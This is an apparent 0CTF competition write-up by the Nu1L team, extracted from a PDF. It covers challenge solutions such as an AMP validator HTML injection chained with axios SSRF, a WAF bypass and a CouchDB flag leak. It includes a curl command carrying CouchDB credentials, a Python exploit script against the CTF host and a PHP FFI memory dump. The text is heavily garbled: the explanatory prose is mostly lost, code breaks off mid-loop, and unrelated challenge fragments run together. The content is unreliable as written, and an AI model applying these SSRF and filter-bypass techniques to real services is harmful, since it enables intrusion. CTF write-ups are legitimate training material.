0CTF WP
Author:Nu1L Team
0CTF WP
WEB
amp2020
easyphp
noeasyphp
lottery
Wechat Generator
Pwn
eeeeeemoji
simple echoserver
Chromium RCE
Re
babymips
Happy Tree
J
w
ﬂash-1
Misc
eeemoji
Cloud Computing
Cloud Computing v2
Crypto
babyring
WEB
amp2020
dockerﬂagenvcouchDBcouchDBHTTP
RCE/SSRF
axios
SSRFWAFWAF SSRFcouchDB
ﬂag
curl 
http://aa015267de77493e88c837682b02c5668:iwantagirlfriend@127.0.0.1:5984/aa015
267de77493e88c837682b02c5668/flag
AMPHTML (amphtml-validator)cheerio
scriptchrome
script
IP127.0.0.1URLaxios
couchDBcouchDBHTTP basic authcookie
iframecouchDB(HTMLsrcHTTP basic
auth)
HTML/XSSchromeaxiosaxios SSRF
couchDBleak ﬂag
1. HTML
cheerioamphtml-validatorbypass
(noscriptiframeamphtml-validator)
axios(metatargetiframe
axios)
2. SSRFWAF
axiosobject
input[a]=xxx&input[b]=yyy{"a":"xxx","b":"yyy"}axios
    Hello, AMPs
    Welcome to the mobile web
else if (body.type === 'url') {
    try {
      const ret = await axios(body.input, { timeout: 5000 })
      input = ret.data
    } catch (e) {
      res.status(500)
axiosIPWAF
HTTP code 307POSTPUTtarget
3. leak ﬂag
ﬂagleak
axiosinput amp html
couchdbjsonaxiosparse
cheeriojson parse  objectstringscript
axios maxContentLength 
throw axioserror
?input[method]=POST
&input[maxRedirects]=5
&input[url]=http://iwantaggirlfriend/rd.php?type=aaa
&input[data][test] = test
couchDBregexpﬂagﬂag
maxContentLength
ﬂag
exploit
    Hello, AMPs
    Welcome to the mobile web
 /insert 
 /login 
diﬀbase64
  aaaaa
import requests
import json
import string  
r = requests.session()
def login():
    burp0_url = "http://pwnable.org:33000/users/login"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, 
deflate", "Referer": "http://pwnable.org:33000/users/login", "Content-Type": 
"application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-
Requests": "1"}
    burp0_data = {"username": "wupco", "password": "wupco"}
    r.post(burp0_url, headers=burp0_headers , data=burp0_data)
def exploit(guesschar):
    login()
    burp0_url = "http://pwnable.org:33000/validator"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "*/*", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, 
deflate", "Referer": "http://pwnable.org:33000/", "Content-Type": 
"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": 
"XMLHttpRequest", "Connection": "close"}
    burp0_data = {"type": "text", "input": "\n\n  \n    \n    \n    Hello, 
AMPs\n    \n    \n    \n  \n  \n    
Welcome to the mobile web\n    \n  
\n  \n"}
    data = r.post(burp0_url, headers=burp0_headers, data=burp0_data).text
    return json.loads(data)["image"]
flagchar = string.ascii_lowercase +"}{_" +string.digits 
+string.ascii_uppercase
flag = ""
#flag{t4ke_a_google_amp_screensh0t_and_fell_into_millions_pit}
for i in range(140):
    j = 0
    while j  object(FFI\CData:char[88])#5 (88) 
{ [0]=> string(1) "•" [1]=> string(1) "" [2]=> string(1) "" [3]=> string(1) "" 
[4]=> string(1) "8" [5]=> string(1) "•" [6]=> string(1) "" [7]=> string(1) "" 
[8]=> string(1) "•" [9]=> string(1) "" [10]=> string(1) "" [11]=> string(1) "" 
[12]=> string(1) "L" [13]=> string(1) "I" [14]=> string(1) "B" [15]=> 
string(1) " " [16]=> string(1) "" [17]=> string(1) " " [18]=> string(1) " " 
[19]=> string(1) " " [20]=> string(1) " " [21]=> string(1) "U" [22]=> 
string(1) "" [23]=> string(1) "" [24]=> string(1) "" [25]=> string(1) " " 
[26]=> string(1) "•" [27]=> string(1) "•" [28]=> string(1) "]" [29]=> 
string(1) "•" [30]=> string(1) "" [31]=> string(1) "" [32]=> string(1) "" 
[33]=> string(1) "" [34]=> string(1) "" [35]=> string(1) "" [36]=> string(1) 
"" [37]=> string(1) "" [38]=> string(1) "" [39]=> string(1) "" [40]=> 
string(1) "C" [41]=> string(1) "O" [42]=> string(1) "P" [43]=> string(1) "E" 
[44]=> string(1) " " [45]=> string(1) """ [46]=> string(1) "f" [47]=> 
string(1) "l" [48]=> string(1) "a" [49]=> string(1) "g" [50]=> string(1) "" 
[51]=> string(1) " " [52]=> string(1) " " [53]=> string(1) "c" [54]=> 
string(1) "h" [55]=> string(1) "a" [56]=> string(1) "@" [57]=> string(1) "a" 
[58]=> string(1) " " [59]=> string(1) "•" [60]=> string(1) "]" [61]=> 
string(1) "•" [62]=> string(1) "" [63]=> string(1) "" [64]=> string(1) "`" 
[65]=> string(1) "`" [66]=> string(1) " " [67]=> string(1) "•" [68]=> 
string(1) "]" [69]=> string(1) "•" [70]=> string(1) "" [71]=> string(1) "" 
[72]=> string(1) "a" [73]=> string(1) "p" [74]=> string(1) "A" [75]=> 
string(1) "3" [76]=> string(1) "H" [77]=> string(1) "1" [78]=> string(1) "(" 
[79]=> string(1) ")" [80]=> string(1) "•" [81]=> string(1) "" [82]=> string(1) 
"" [83]=> string(1) "" [84]=> string(1) "" [85]=> string(1) "" [86]=> 
string(1) "" [87]=> string(1) "" } }
print_r(FFI::string($aa-%3Eflag_wAt3_uP_apA3H1()));
import requests
import base64
import random
import string
table = string.ascii_lowercase + string.digits
Wechat Generator
mine = 
'4EGLYPQmvDYL3T0csTrb/UasaeUAwnNRSsj7+v2O317kWrVccOQLjT5mEsSts+E1JlJbZW06kKjoW
2+5AurC8B+gWLiDN9cG6AwpqubnB/fW0QabiQ17JLgIDt6eiasHPdUqULBnKVY0eePPLv02MPhIZnV